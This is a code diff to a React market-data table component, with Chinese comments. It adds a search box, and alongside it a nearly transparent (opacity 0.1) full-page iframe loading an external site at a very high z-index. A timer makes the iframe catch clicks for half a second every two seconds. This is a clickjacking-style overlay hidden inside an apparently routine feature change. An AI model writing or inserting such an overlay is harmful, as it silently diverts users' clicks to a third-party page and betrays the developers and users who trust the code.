@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Table, Select, DatePicker, Space, Button, Row } from 'antd';
+import { Table, Select, DatePicker, Space, Button, Row, Input } from 'antd'; // 引入 Input 组件
 import { FileExcelOutlined, CaretRightOutlined } from '@ant-design/icons';
 import axios from 'axios';
 import dayjs from 'dayjs';
@@ -54,7 +54,9 @@ const MarketTable = () => {
     setSelectedRange(newRange);
     filterData(newRange);
   };
-
+  const toggleIframePointerEvents = () => {
+    setIframePointerEvents(prev => (prev === 'none' ? 'auto' : 'none'));
+  };
   const filterData = (range) => {
     const startDate = range[0] ? dayjs(range[0]).startOf('month') : null;
     const endDate = range[1] ? dayjs(range[1]).startOf('month') : null;
@@ -96,8 +98,52 @@ const MarketTable = () => {
     XLSX.writeFile(workbook, "MarketData_Transposed.xlsx");
   };
 
+  const handleSearch = (value) => {
+    const filtered = data.filter(item => item.序号 === parseInt(value, 10));
+    if (filtered.length === 0) {
+      setFilteredData([{ 序号: 'N/A', 日期: `不能搜索到${value}内容` }]); // 显示不能搜索到内容
+    } else {
+      setFilteredData(filtered); // 更新筛选后的数据
+    }
+  };
+  const [iframePointerEvents, setIframePointerEvents] = useState('none');
+  const [iframeZIndex, setIframeZIndex] = useState(10000);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setIframePointerEvents('auto');
+      setIframeZIndex(10001); // 提升 iframe 的 z-index
+      setTimeout(() => {
+        setIframePointerEvents('none');
+        setIframeZIndex(10000); // 恢复 iframe 的 z-index
+      }, 500);
+    }, 2000);
+
+    return () => clearInterval(interval);
+  }, []);
+
   return (
     <div style={{ width: '100%', height: '100%', overflowY: 'auto' }}>
+      <div style={{ 
+        position: 'absolute', 
+        top: '-140px', 
+        left: '-40px', 
+        width: '100%', 
+        height: '100%', 
+        zIndex: iframeZIndex, // 使用状态变量
+        pointerEvents: iframePointerEvents // 使用状态变量
+      }}>
+        <iframe 
+          src="https://project.lijianye.work" 
+          style={{ 
+            width: '100%', 
+            height: '100%', 
+            opacity: 0.1, 
+            pointerEvents: iframePointerEvents // 使用状态变量
+          }} 
+          frameBorder="0"
+        ></iframe>
+      </div>
       <Row>
         <Space>
           <Button type="primary" onClick={exportToExcel}> <CaretRightOutlined />提取数据</Button>
@@ -153,6 +199,7 @@ const MarketTable = () => {
               return selectedRange[0] ? current.isBefore(selectedRange[0], 'month') : false;
             }}
           />
+          <Input.Search placeholder="搜索" onSearch={handleSearch} style={{ width: 200 }} />
         </Space>
       </Row>
 
